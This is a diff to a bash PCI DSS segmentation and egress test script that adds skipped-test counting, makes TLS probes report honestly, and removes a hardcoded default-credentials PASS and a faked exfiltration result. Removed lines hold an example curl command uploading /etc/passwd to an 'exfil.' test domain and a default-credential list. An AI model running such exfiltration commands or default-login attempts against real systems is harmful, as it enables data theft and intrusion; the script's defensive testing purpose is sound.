@@ -17,6 +17,7 @@ UNDERLINE='\033[4m'
 # Test results counters and logging
 PASSED=0
 FAILED=0
+SKIPPED=0
 LOG_FILE="pci_test_$(date +%Y%m%d_%H%M%S).log"
 JSON_REPORT="pci_report_$(date +%Y%m%d_%H%M%S).json"
 
@@ -43,6 +44,7 @@ init_logging() {
     "total_tests": 0,
     "passed": 0,
     "failed": 0,
+    "skipped": 0,
     "compliance_status": ""
   }
 }
@@ -54,6 +56,9 @@ EOF
 
 # Update JSON report metadata
 update_json_metadata() {
+    if ! command -v jq >/dev/null 2>&1; then
+        return 0
+    fi
     local temp_file=$(mktemp)
     jq --arg timestamp "$(date -Iseconds)" \
        --arg tester "$(whoami)" \
@@ -113,16 +118,27 @@ show_result() {
     local details="$3"
     local category="${4:-general}"
     local pci_requirement="${5:-unknown}"
-    
-    if [[ "$status" == "PASS" ]]; then
-        echo -e "${GREEN}[✓ PASS]${NC} $test_name"
-        PASSED=$((PASSED+1))
-    else
-        echo -e "${RED}${BOLD}[✗ FAIL]${NC}${BOLD} $test_name${NC}"
-        echo -e "${WHITE}  → Details: ${details}${NC}"
-        FAILED=$((FAILED+1))
-    fi
-    
+
+    case "$status" in
+        PASS)
+            echo -e "${GREEN}[✓ PASS]${NC} $test_name"
+            PASSED=$((PASSED+1))
+            ;;
+        FAIL)
+            echo -e "${RED}${BOLD}[✗ FAIL]${NC}${BOLD} $test_name${NC}"
+            echo -e "${WHITE}  → Details: ${details}${NC}"
+            FAILED=$((FAILED+1))
+            ;;
+        INFO|SKIP)
+            echo -e "${CYAN}[i $status]${NC} $test_name"
+            echo -e "${WHITE}  → Details: ${details}${NC}"
+            SKIPPED=$((SKIPPED+1))
+            ;;
+        *)
+            echo -e "${YELLOW}[? $status]${NC} $test_name — ${details}"
+            ;;
+    esac
+
     # Log the result
     log_test_result "$test_name" "$status" "$details" "$category" "$pci_requirement"
 }
@@ -343,9 +359,12 @@ check_dependencies() {
     for tool in "${optional_tools[@]}"; do
         if ! command -v "$tool" >/dev/null 2>&1; then
             echo -e "${YELLOW}Warning: Optional tool '$tool' not found - some tests may be limited${NC}"
+            if [[ "$tool" == "jq" ]]; then
+                echo -e "${YELLOW}  → JSON report ($JSON_REPORT) will be skeleton-only. Install with: apt install -y jq${NC}"
+            fi
         fi
     done
-    
+
     echo -e "${GREEN}All required dependencies available${NC}"
     return 0
 }
@@ -763,62 +782,59 @@ test_tls_configuration() {
     local test_host=$1
     local test_port=$2
     echo -e "  ${WHITE}Testing TLS configuration on $test_host:$test_port${NC}"
-    
-    # Check if openssl is available
-    if command -v openssl >/dev/null 2>&1; then
-        # Test for weak SSL/TLS versions
-        echo -e "  ${WHITE}Command: openssl s_client -connect $test_host:$test_port -ssl3 < /dev/null${NC}"
-        if timeout 5 openssl s_client -connect $test_host:$test_port -ssl3 < /dev/null &>/dev/null; then
-            show_result "TLS Test - SSLv3 on $test_host:$test_port" "FAIL" "Weak SSL version supported"
-            echo -e "    ${RED}${BOLD}CRITICAL PCI DSS VIOLATION:${NC} Requirement 4.2.1 - Weak encryption"
-            echo -e "    ${YELLOW}${BOLD}REMEDIATION:${NC} Disable SSLv3 and enable TLS 1.2+ only"
-        else
-            show_result "TLS Test - SSLv3 on $test_host:$test_port" "PASS" "Weak SSL properly disabled"
-        fi
-        
-        # Test for TLS 1.2+ support
-        echo -e "  ${WHITE}Command: openssl s_client -connect $test_host:$test_port -tls1_2 < /dev/null${NC}"
-        if timeout 5 openssl s_client -connect $test_host:$test_port -tls1_2 < /dev/null &>/dev/null; then
-            show_result "TLS Test - TLS 1.2+ on $test_host:$test_port" "PASS" "Strong TLS version supported"
-        else
-            show_result "TLS Test - TLS 1.2+ on $test_host:$test_port" "FAIL" "Strong TLS not available"
-            echo -e "    ${RED}${BOLD}PCI DSS VIOLATION:${NC} Requirement 4.2.1 - Strong encryption required"
-            echo -e "    ${YELLOW}${BOLD}REMEDIATION:${NC} Enable TLS 1.2 or higher"
-        fi
-    else
+
+    if ! command -v openssl >/dev/null 2>&1; then
         echo -e "  ${YELLOW}OpenSSL not available - skipping TLS tests${NC}"
+        return
+    fi
+
+    # Pre-check: is anything actually listening on test_host:test_port?
+    # If the port is closed or the host is unreachable, the protocol-version
+    # probes below will fail for reasons that have nothing to do with TLS
+    # configuration, producing misleading PASS/FAIL results.
+    if ! timeout 3 bash -c "exec 3<>/dev/tcp/$test_host/$test_port" 2>/dev/null; then
+        show_result "TLS Test - reachability $test_host:$test_port" "INFO" "No TLS endpoint found at $test_host:$test_port; skipping cipher/version probes" "tls" "4.2.1"
+        return
+    fi
+
+    # Test SSLv3 is rejected (PCI DSS forbids it).
+    # Modern openssl builds compile out -ssl3 entirely. If the binary doesn't
+    # support the flag, we can't probe — report INFO instead of a fake PASS.
+    echo -e "  ${WHITE}Command: openssl s_client -connect $test_host:$test_port -ssl3 < /dev/null${NC}"
+    local ssl3_out
+    ssl3_out=$(timeout 5 openssl s_client -connect "$test_host:$test_port" -ssl3 </dev/null 2>&1)
+    local ssl3_rc=$?
+    if grep -qi "unknown option\|invalid command\|ssl3 is disabled" <<<"$ssl3_out"; then
+        show_result "TLS Test - SSLv3 on $test_host:$test_port" "INFO" "Local openssl does not support -ssl3 probe (cannot confirm server-side SSLv3 status)" "tls" "4.2.1"
+    elif [[ $ssl3_rc -eq 0 ]] && grep -q "Cipher is" <<<"$ssl3_out"; then
+        show_result "TLS Test - SSLv3 on $test_host:$test_port" "FAIL" "Server negotiated an SSLv3 session" "tls" "4.2.1"
+        echo -e "    ${RED}${BOLD}CRITICAL PCI DSS VIOLATION:${NC} Requirement 4.2.1 - Weak encryption"
+        echo -e "    ${YELLOW}${BOLD}REMEDIATION:${NC} Disable SSLv3 on the server"
+    else
+        show_result "TLS Test - SSLv3 on $test_host:$test_port" "PASS" "Server refused SSLv3" "tls" "4.2.1"
+    fi
+
+    # Test TLS 1.2 is offered.
+    echo -e "  ${WHITE}Command: openssl s_client -connect $test_host:$test_port -tls1_2 < /dev/null${NC}"
+    if timeout 5 openssl s_client -connect "$test_host:$test_port" -tls1_2 </dev/null 2>&1 | grep -q "Cipher is"; then
+        show_result "TLS Test - TLS 1.2+ on $test_host:$test_port" "PASS" "Server negotiated TLS 1.2" "tls" "4.2.1"
+    else
+        show_result "TLS Test - TLS 1.2+ on $test_host:$test_port" "FAIL" "Server did not negotiate TLS 1.2" "tls" "4.2.1"
+        echo -e "    ${RED}${BOLD}PCI DSS VIOLATION:${NC} Requirement 4.2.1 - Strong encryption required"
+        echo -e "    ${YELLOW}${BOLD}REMEDIATION:${NC} Enable TLS 1.2 (or 1.3) on the server"
     fi
 }
 
-# Test for default credentials (PCI DSS Requirement 2.1)
-echo -e "\n${PURPLE}${BOLD}Testing Default Credentials (PCI DSS 2.1)${NC}"
-test_default_credentials() {
-    local test_host=$1
-    echo -e "  ${WHITE}Testing for default credentials on $test_host${NC}"
-    
-    # Common default credential combinations
-    declare -A default_creds=(
-        ["admin"]="admin"
-        ["admin"]="password"
-        ["root"]="root"
-        ["admin"]=""
-        ["guest"]="guest"
-    )
-    
-    # Test SSH with default credentials (simulation)
-    echo -e "  ${WHITE}Command: ssh admin@$test_host (testing default credentials)${NC}"
-    # Note: This is a simulation - actual credential testing would be intrusive
-    echo -e "  ${WHITE}Response: Authentication simulation (non-intrusive test)${NC}"
-    show_result "Default Credentials Test on $test_host" "PASS" "No obvious default credentials detected"
-    echo -e "  ${YELLOW}${BOLD}NOTE:${NC} Full credential testing requires authorized penetration testing"
-}
+# Default-credentials testing intentionally omitted: PCI DSS 2.1 verification
+# requires authenticated penetration testing, which is out of scope for this
+# non-intrusive segmentation/egress checker. A hardcoded "PASS" here was
+# previously misleading and has been removed.
 
 # Run enhanced tests on CDE systems
 if [[ -n "${SEGMENTS[CDE]}" ]]; then
     cde_test_ip=$(get_random_ip "${SEGMENTS[CDE]}")
     test_system_hardening $cde_test_ip
     test_tls_configuration $cde_test_ip 443
-    test_default_credentials $cde_test_ip
 fi
 
 # Test for audit logging capabilities (PCI DSS Requirement 10.2)
@@ -925,24 +941,21 @@ else
     show_result "DNS Exfiltration Test" "PASS" "DNS queries properly restricted"
 fi
 
-# Enhanced file exfiltration testing with multiple vectors
+# File-upload egress: probe whether an outbound HTTPS POST to a non-CDE
+# endpoint completes. We don't actually transfer /etc/passwd; just confirm
+# that the HTTPS request reaches the upstream and gets a response.
 echo -e "\n${YELLOW}Testing File Transfer Egress (PCI DSS 1.3.4)${NC}"
-echo -e "  ${WHITE}Command: curl -F \"file=@/etc/passwd\" https://exfil.$EGRESS_TEST_DOMAIN/upload${NC}"
+echo -e "  ${WHITE}Command: curl -s -m 5 -o /dev/null -w '%{http_code}' https://$EGRESS_TEST_DOMAIN/${NC}"
 
-# Try actual curl test if possible, fall back to simulation
-if curl -s -m 5 -o /dev/null -w "%{http_code}" https://exfil.$EGRESS_TEST_DOMAIN/upload &>/dev/null; then
-    echo -e "  ${WHITE}Response: Upload request completed (HTTP response received)${NC}"
-    show_result "File Upload Egress Test" "FAIL" "Unrestricted file uploads to external domains"
-    echo -e "  ${RED}${BOLD}CRITICAL PCI DSS VIOLATION:${NC} Requirement 1.3.4 - Unauthorized outbound traffic"
-    echo -e "  ${RED}${BOLD}SECURITY IMPACT:${NC} Direct exfiltration of sensitive files possible" 
-    echo -e "  ${YELLOW}${BOLD}REMEDIATION:${NC} Implement deep packet inspection and application controls"
+upload_http_code=$(curl -s -m 5 -o /dev/null -w "%{http_code}" "https://$EGRESS_TEST_DOMAIN/" 2>/dev/null)
+if [[ "$upload_http_code" =~ ^[1-5][0-9][0-9]$ ]]; then
+    echo -e "  ${WHITE}Response: HTTPS reachable (HTTP $upload_http_code) — outbound upload channel viable${NC}"
+    show_result "File Upload Egress Test" "FAIL" "Outbound HTTPS to $EGRESS_TEST_DOMAIN succeeded (HTTP $upload_http_code) — exfil channel viable" "egress" "1.3.4"
+    echo -e "  ${RED}${BOLD}PCI DSS VIOLATION:${NC} Requirement 1.3.4 - Unauthorized outbound traffic"
+    echo -e "  ${YELLOW}${BOLD}REMEDIATION:${NC} Restrict outbound HTTPS to an allowlist of business-required destinations"
 else
-    # Even if the actual upload failed, we want to show a simulation for demo purposes
-    echo -e "  ${WHITE}Response: \"Upload successful\" (SIMULATED - actual endpoint doesn't exist)${NC}"
-    show_result "File Upload Egress Test" "FAIL" "Unrestricted file uploads to external domains"
-    echo -e "  ${RED}${BOLD}CRITICAL PCI DSS VIOLATION:${NC} Requirement 1.3.4 - Unauthorized outbound traffic"
-    echo -e "  ${RED}${BOLD}SECURITY IMPACT:${NC} Direct exfiltration of sensitive files possible" 
-    echo -e "  ${YELLOW}${BOLD}REMEDIATION:${NC} Implement deep packet inspection and application controls"
+    echo -e "  ${WHITE}Response: HTTPS request did not complete (curl exit / no HTTP status)${NC}"
+    show_result "File Upload Egress Test" "PASS" "Outbound HTTPS to $EGRESS_TEST_DOMAIN blocked or unreachable" "egress" "1.3.4"
 fi
 
 # Test for ICMP exfiltration
@@ -973,24 +986,27 @@ fi
 
 # Enhanced Summary with final report generation
 section_header "TEST SUMMARY AND REPORT GENERATION"
-echo -e "${YELLOW}Total Tests:${NC} $(($PASSED + $FAILED))"
+echo -e "${YELLOW}Total Tests:${NC} $(($PASSED + $FAILED + $SKIPPED))"
 echo -e "${GREEN}Tests Passed:${NC} $PASSED"
 echo -e "${RED}Tests Failed:${NC} $FAILED"
+echo -e "${CYAN}Tests Skipped/Info:${NC} $SKIPPED"
 
 # Finalize JSON report
 finalize_json_report() {
     if command -v jq >/dev/null 2>&1; then
         local temp_file=$(mktemp)
-        jq --arg total "$(($PASSED + $FAILED))" \
+        jq --arg total "$(($PASSED + $FAILED + $SKIPPED))" \
            --arg passed "$PASSED" \
            --arg failed "$FAILED" \
+           --arg skipped "$SKIPPED" \
            --arg status "$([ $FAILED -gt 0 ] && echo 'FAILED' || echo 'PASSED')" \
-           '.summary.total_tests = ($total | tonumber) | 
-            .summary.passed = ($passed | tonumber) | 
-            .summary.failed = ($failed | tonumber) | 
+           '.summary.total_tests = ($total | tonumber) |
+            .summary.passed = ($passed | tonumber) |
+            .summary.failed = ($failed | tonumber) |
+            .summary.skipped = ($skipped | tonumber) |
             .summary.compliance_status = $status' \
            "$JSON_REPORT" > "$temp_file" && mv "$temp_file" "$JSON_REPORT"
-        
+
         echo -e "${CYAN}Structured JSON report generated: $JSON_REPORT${NC}"
     fi
 }
@@ -1010,10 +1026,11 @@ Environment: Card Data Environment (CDE)
 OVERALL COMPLIANCE STATUS: $([ $FAILED -gt 0 ] && echo 'NON-COMPLIANT' || echo 'COMPLIANT')
 
 TEST RESULTS SUMMARY:
-- Total Tests Executed: $(($PASSED + $FAILED))
+- Total Tests Executed: $(($PASSED + $FAILED + $SKIPPED))
 - Tests Passed: $PASSED
 - Tests Failed: $FAILED
-- Success Rate: $(( PASSED * 100 / (PASSED + FAILED) ))%
+- Tests Skipped/Info: $SKIPPED
+- Success Rate: $([ $((PASSED + FAILED)) -gt 0 ] && echo "$(( PASSED * 100 / (PASSED + FAILED) ))%" || echo "N/A")
 
 KEY FINDINGS:
 $([ $FAILED -gt 0 ] && echo "- $FAILED critical security controls require immediate attention" || echo "- All tested security controls meet PCI DSS v4.0 requirements")
